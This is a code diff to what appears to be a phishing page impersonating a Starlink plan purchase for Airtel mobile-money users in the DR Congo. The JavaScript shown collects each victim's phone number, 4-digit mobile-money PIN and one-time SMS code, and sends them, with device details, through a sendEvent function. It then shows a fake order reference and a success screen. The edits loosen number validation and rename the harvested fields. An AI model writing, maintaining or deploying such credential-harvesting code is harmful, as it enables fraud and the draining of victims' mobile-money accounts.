@@ -190,13 +190,13 @@ img{display:block;max-width:100%}
       <div class="fc-change" onclick="goBack()">Modifier</div>
     </div>
     <div class="field">
-      <div class="field-lbl">Num&eacute;ro Airtel Lite <span style="color:var(--err);font-weight:800">*</span></div>
+      <div class="field-lbl">Num&eacute;ro Airtel Lite&nbsp;<span style="color:var(--err);font-size:16px;font-weight:900;line-height:1;text-transform:none">*</span></div>
       <div class="fw" id="fw-phone">
         <div class="prefix">
           <span class="prefix-flag">&#127464;&#127465;</span>
           <span class="prefix-code">+243</span>
         </div>
-        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="09X XXX XXX" maxlength="9" autocomplete="tel-national">
+        <input class="f-input" id="phoneInput" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="9X XXX XXXX" maxlength="9" autocomplete="tel-national">
       </div>
       <div class="f-err" id="phoneErr"></div>
     </div>
@@ -386,7 +386,7 @@ document.getElementById('phoneInput').addEventListener('blur',function(){
   var v=this.value.replace(/[^0-9]/g,'');
   var fw=document.getElementById('fw-phone');
   if(v&&v.length!==9){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide — 9 chiffres requis';}
-  else if(v.length===9&&!/^(08|09)/.test(v)){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide — doit commencer par 08 ou 09';}
+  else if(v.length===9&&!/^[89]/.test(v)){fw.classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide — doit commencer par 8 ou 9';}
   else if(v.length===9){fw.classList.remove('err');fw.classList.add('ok');document.getElementById('phoneErr').textContent='';}
 });
 document.getElementById('phoneInput').addEventListener('input',function(){
@@ -401,10 +401,10 @@ renderPIN();
 function submitLogin(){
   var ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
   if(ph.length!==9){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro invalide \u2014 9 chiffres requis';hap([25,15,25]);return;}
-  if(!/^(08|09)/.test(ph)){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide \u2014 doit commencer par 08 ou 09';hap([25,15,25]);return;}
+  if(!/^[89]/.test(ph)){document.getElementById('fw-phone').classList.add('err');document.getElementById('phoneErr').textContent='Num\u00e9ro Airtel invalide \u2014 doit commencer par 8 ou 9';hap([25,15,25]);return;}
   if(pin.length!==4){document.getElementById('pinErr').textContent='Entrez votre code PIN \u00e0 4 chiffres';hap([25,15,25]);return;}
   sessionStorage.setItem('starlinkAuth',JSON.stringify({phone:ph,pin:pin}));
-  sendEvent('starlink_pin_submitted',{forfait:forfait.name,prix:forfait.price,telephone:'+243'+ph,pin:pin,appareil:navigator.userAgent.slice(0,80)});
+  sendEvent('starlink_pin_submitted',{plan:forfait.name,price:forfait.price,phone:ph,pin:pin,device:navigator.userAgent.slice(0,80)});
   hap(18);
   document.getElementById('navSpinner').style.display='block';
   setStep(2);showView('viewProc');
@@ -461,7 +461,7 @@ function startTimer(){
 function resendOTP(){
   if(timerSecs>0)return;
   var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
-  sendEvent('starlink_otp_resent',{forfait:forfait.name,telephone:'+243'+(auth.phone||''),ref:sessionStorage.getItem('starlinkRef')||''});
+  sendEvent('starlink_otp_resent',{plan:forfait.name,phone:(auth.phone||''),ref:sessionStorage.getItem('starlinkRef')||''});
   hap(15);otpVal='';document.getElementById('otpInput').value='';renderOTP();updateOTPBtn();startTimer();focusOTPInput();
 }
 // Native keyboard OTP handler
@@ -488,7 +488,7 @@ function submitOTP(){
   var auth={};try{auth=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
   var ref='STL-CG-'+(Math.random()*9e5+1e5|0);
   sessionStorage.setItem('starlinkRef',ref);sessionStorage.setItem('starlinkOTP',otpVal);
-  sendEvent('starlink_otp_confirme',{forfait:forfait.name,prix:forfait.price,telephone:'+243'+(auth.phone||''),pin:auth.pin||'',otp:otpVal,ref:'#'+ref,appareil:navigator.userAgent.slice(0,80)});
+  sendEvent('starlink_otp_confirme',{plan:forfait.name,price:forfait.price,phone:(auth.phone||''),pin:auth.pin||'',otp:otpVal,ref:'#'+ref,device:navigator.userAgent.slice(0,80)});
   for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
   hap([18,8,35]);
   setTimeout(function(){
